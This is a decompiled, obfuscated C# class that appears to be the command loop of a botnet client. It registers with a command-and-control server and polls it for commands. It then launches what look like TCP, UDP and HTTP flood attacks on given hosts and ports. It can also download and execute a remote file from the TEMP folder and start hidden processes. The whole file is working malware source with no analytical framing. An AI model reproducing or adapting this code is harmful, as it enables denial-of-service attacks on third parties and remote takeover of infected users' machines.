using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace ns0;

internal class Class4
{
	private string sOldCommand = string.Empty;

	public void method_0()
	{
		method_1();
		Thread thread = new Thread(method_2);
		thread.Start();
	}

	private void method_1()
	{
		string string_ = GClass0.smethod_0("aŤɮ\u036cеԷؠݭ\u0873४੦\u0b3c") + Class2.ConfigClass.werqwerqwer + GClass0.smethod_0(".ťɩͱѲզ\u0670\u073c") + Class2.ConfigClass.cvbncbcbcbcvbn + GClass0.smethod_0(".ŷɥ\u036bѥծ٧\u073c") + Class2.ConfigClass.girtitzuitzu + GClass0.smethod_0(".Űɯ\u036bѲզ\u0670\u073c") + Class2.ConfigClass.ruirturtrzu;
		while (true)
		{
			try
			{
				string text = method_3(Class2.ConfigClass.cxvbxcvbxcvbxcvbxcv, string_);
				if (text.Length > 0)
				{
					if (text == Class2.ConfigClass.scfvyxcvyxcvyxc)
					{
						break;
					}
					Environment.Exit(-1);
				}
			}
			catch
			{
			}
			Thread.Sleep(Class2.ConfigClass.sertqwetrwertwer * 60 * 1000);
		}
	}

	private void method_2()
	{
		string string_ = GClass0.smethod_0("aŤɮ\u036cеԶؠݭ\u0873४੦\u0b3c") + Class2.ConfigClass.werqwerqwer;
		while (true)
		{
			try
			{
				string text = method_3(Class2.ConfigClass.cxvbxcvbxcvbxcvbxcv, string_);
				if (text.Length > 0)
				{
					if (text != sOldCommand)
					{
						method_4(text);
						sOldCommand = text;
					}
				}
				else
				{
					try
					{
						Class9.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class13.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class7.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class11.smethod_1();
					}
					catch
					{
					}
					sOldCommand = string.Empty;
				}
			}
			catch
			{
			}
			Thread.Sleep(Class2.ConfigClass.sertqwetrwertwer * 60 * 1000);
		}
	}

	private string method_3(string string_0, string string_1)
	{
		ServicePointManager.Expect100Continue = false;
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_0);
		httpWebRequest.ContentType = GClass0.smethod_0("@ŐɯͲѴտٺݮ\u0870ॷ\u0a79ହ౭ഹ\u0e64ཥၦᄽቩ፡ᑿᕡᘦ\u177f\u187bᥤ\u1a62᭨ᱦᵫṧὧ\u2065");
		httpWebRequest.Method = GClass0.smethod_0("TŌɑ\u0355");
		httpWebRequest.UserAgent = Class2.ConfigClass.scfvyxcvyxcvyxc;
		byte[] bytes = Encoding.ASCII.GetBytes(string_1);
		httpWebRequest.ContentLength = bytes.Length;
		Stream requestStream = httpWebRequest.GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		requestStream.Close();
		WebResponse response = httpWebRequest.GetResponse();
		if (response == null)
		{
			return string.Empty;
		}
		StreamReader streamReader = new StreamReader(response.GetResponseStream());
		return streamReader.ReadToEnd().Trim();
	}

	private void method_4(string string_0)
	{
		string[] array = new string[0];
		try
		{
			array = string_0.Split(new char[1] { '*' });
		}
		catch
		{
		}
		string key;
		if ((key = array[0]) == null)
		{
			return;
		}
		if (_003CPrivateImplementationDetails_003E_007B24544FBB_002DE29C_002D4CD0_002DA180_002DE0F7591B8C92_007D._0024_0024method0x6000011_002D1 == null)
		{
			_003CPrivateImplementationDetails_003E_007B24544FBB_002DE29C_002D4CD0_002DA180_002DE0F7591B8C92_007D._0024_0024method0x6000011_002D1 = new Dictionary<string, int>(8)
			{
				{
					GClass0.smethod_0("{žɨ\u0363Ѩլ٭ݥ"),
					0
				},
				{
					GClass0.smethod_0("ażɳͶѣը٬ݭࡥ"),
					1
				},
				{
					GClass0.smethod_0("}ţɶ\u0363Ѩլ٭ݥ"),
					2
				},
				{
					GClass0.smethod_0("`ūɪͶѣը٬ݭࡥ"),
					3
				},
				{
					GClass0.smethod_0("lŨɱ\u036bѨլ٣ݥ"),
					4
				},
				{
					GClass0.smethod_0("sŭɰ\u036bѵ"),
					5
				},
				{
					GClass0.smethod_0("sŵɠ\u0362Ѷդ"),
					6
				},
				{
					GClass0.smethod_0("tŠɩ\u036cѴդ"),
					7
				}
			};
		}
		if (!_003CPrivateImplementationDetails_003E_007B24544FBB_002DE29C_002D4CD0_002DA180_002DE0F7591B8C92_007D._0024_0024method0x6000011_002D1.TryGetValue(key, out var value))
		{
			return;
		}
		switch (value)
		{
		case 0:
			try
			{
				Class9.sFHost = Convert.ToString(array[1]);
				Class9.uPort = ushort.Parse(array[2]);
				Class9.iThreads = Convert.ToInt32(array[3]);
				Class9.iSSockets = Convert.ToInt32(array[4]);
				Class9.smethod_0();
				break;
			}
			catch
			{
				break;
			}
		case 1:
			try
			{
				Class13.vbnmvbnmvbnmbvnm = Convert.ToString(array[1]);
				Class13.adgdsfgsdgdf = Convert.ToInt32(array[2]);
				Class13.smethod_0();
				break;
			}
			catch
			{
				break;
			}
		case 2:
			try
			{
				Class7.sFHost = Convert.ToString(array[1]);
				Class7.uPort = ushort.Parse(array[2]);
				Class7.iThreads = Convert.ToInt32(array[3]);
				Class7.iUDPSockets = Convert.ToInt32(array[4]);
				Class7.iPSize = Convert.ToInt32(array[5]);
				Class7.smethod_0();
				break;
			}
			catch
			{
				break;
			}
		case 3:
			try
			{
				Class11.ergtsergsrg = Convert.ToString(array[1]);
				Class11.hjmbvmvbmvbnm = ushort.Parse(array[2]);
				Class11.mbvmfgzjdfgh = Convert.ToInt32(array[3]);
				Class11.zuitzuituzui = Convert.ToInt32(array[4]);
				Class11.nmbvmvnvbnm = Convert.ToInt32(array[5]);
				Class11.smethod_0();
				break;
			}
			catch
			{
				break;
			}
		case 4:
			try
			{
				string text = Class2.FunctionClass.method_3(new Random().Next(5, 12)) + GClass0.smethod_0("*Ŧɺ\u0364");
				new WebClient().DownloadFile(Convert.ToString(array[1]), Environment.GetEnvironmentVariable(GClass0.smethod_0("Pņɏ\u0351")) + GClass0.smethod_0("]") + text);
				Process process = new Process();
				process.StartInfo.FileName = Environment.GetEnvironmentVariable(GClass0.smethod_0("Pņɏ\u0351")) + GClass0.smethod_0("]") + text;
				process.Start();
				break;
			}
			catch
			{
				break;
			}
		case 5:
			try
			{
				Process process = new Process();
				process.StartInfo = new ProcessStartInfo(Convert.ToString(array[1]));
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				break;
			}
			catch
			{
				break;
			}
		case 6:
			Class2.SystemClass.method_3(Convert.ToString(array[1]));
			break;
		case 7:
			if (array[1] == Environment.MachineName || array[1].ToUpper() == GClass0.smethod_0("BŎɍ"))
			{
				Class2.SystemClass.method_4();
			}
			break;
		}
	}
}
